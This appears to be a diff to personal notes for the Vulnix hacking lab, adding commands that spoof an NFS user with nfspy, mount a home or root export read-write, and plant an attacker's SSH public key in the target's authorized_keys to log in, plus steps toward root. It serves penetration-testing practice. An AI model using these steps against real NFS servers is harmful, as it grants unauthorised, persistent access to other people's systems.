@@ -114,8 +114,59 @@ Create a spoof user
 		sudo -u vulnix_user ls -a vulnix
 		<if you have permissions now, it should show the file listing in the directory>
 		
-		
-**FIND OUT HOW TO GENERATE SSH KEYS AND PUT HERE **
+Can also use nfspy, this spoofs user instead of really creating it
+https://github.com/bonsaiviking/NfSpy
+
+		nfspy -o server=192.168.2.4:/home/vulnix,nfsport=2049/tcp,rw vulnix
+		or for root:
+		nfspy -o server=192.168.2.4:/,nfsport=2049/tcp,rw ~/vulnix_root
+
+
+SSL KEY STUFF (figure this out later) original url: https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb
+
+		root@kali:~# ls /root/.ssh/
+		root@kali:~# ssh-keygen
+		Generating public/private rsa key pair.
+		Enter file in which to save the key (/root/.ssh/id_rsa):
+		Enter passphrase (empty for no passphrase):
+		Enter same passphrase again:
+		Your identification has been saved in /root/.ssh/id_rsa.
+		Your public key has been saved in /root/.ssh/id_rsa.pub.
+		The key fingerprint is:
+		SHA256:VoZMUJiHramBTJnCofq3Osa2s3JaFFJP0yct0V5KKwU root@kali
+		The key's randomart image is:
+		+---[RSA 2048]----+
+		|..ooo.E%o        |
+		|oo+o .BoO..      |
+		|o+...  @o+o      |
+		|..o.. + +o       |
+		|. .  o .S        |
+		| o  .  .         |
+		| .o .            |
+		|..B. .           |
+		|.*+*.            |
+		+----[SHA256]-----+
+		root@kali:~# ls /root/.ssh/
+		id_rsa  id_rsa.pub
+		root@kali:~# cat /root/.ssh/id_rsa.pub
+		ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC42NpxutFyfjQuOtZRiHzS/HRgCDQZZrrmizKrLmnhWy4RbzMqFc/URB22QtHkQLnX4libQkGKaSce2bEE2mF0DKB8oX/O9L+J7BYf5d7C6UQ1fLXN1Tg3Ls4QbKBrQGKPH14rdmzSe+ESKc5fE+cvBhB7f8Ub4HnZTDhLCSLJoyzNf85BkU/QjjWymxEXaoSDhg9vPgXEeQAAUCikkpcTwE5PVGG8z+m1fR0OZnzm45sfe2b+NI18owH60oGm8n8O6jOivsvlohXpNrcCm2Ago994zVA4V9ntPd6owXb77Wu1w8Zz1x1dK79QvIook18B6SIhnjJWyFgxHox2Gg8F root@kali
+
+
+Copy key into target's authorized keys(figure this out later too)
+
+		root@kali:~# su vulnix
+		$ cd /tmp/nfs
+		$ ls -la
+		total 20
+		drwxr-x---  2 vulnix vulnix 4096 May 16 16:25 .
+		drwxrwxrwt 15 root   root   4096 May 16 18:36 ..
+		-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout
+		-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc
+		-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile
+		$ mkdir .ssh
+		$ cd .ssh
+		$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC42NpxutFyfjQuOtZRiHzS/HRgCDQZZrrmizKrLmnhWy4RbzMqFc/URB22QtHkQLnX4libQkGKaSce2bEE2mF0DKB8oX/O9L+J7BYf5d7C6UQ1fLXN1Tg3Ls4QbKBrQGKPH14rdmzSe+ESKc5fE+cvBhB7f8Ub4HnZTDhLCSLJoyzNf85BkU/QjjWymxEXaoSDhg9vPgXEeQAAUCikkpcTwE5PVGG8z+m1fR0OZnzm45sfe2b+NI18owH60oGm8n8O6jOivsvlohXpNrcCm2Ago994zVA4V9ntPd6owXb77Wu1w8Zz1x1dK79QvIook18B6SIhnjJWyFgxHox2Gg8F root@kali > authorized_keys
+
 
 Copy own key into target's authorized keys
 
@@ -125,7 +176,7 @@ SSH into target
 
 		ssh vulnix@<ip>
 		
-** extras *8
+** extras **
 
 		cat /etc/exports
 		/home/vulnix	*(rw,root_squash)
@@ -140,3 +191,7 @@ remount the thing
 spoof root uid and gid
 add new key again
 ssh in as root
+
+
+Link to walkthrough
+https://blog.christophetd.fr/write-up-vulnix/
